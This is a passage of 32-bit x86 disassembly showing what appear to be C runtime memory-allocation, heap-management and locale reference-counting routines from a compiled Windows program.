  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
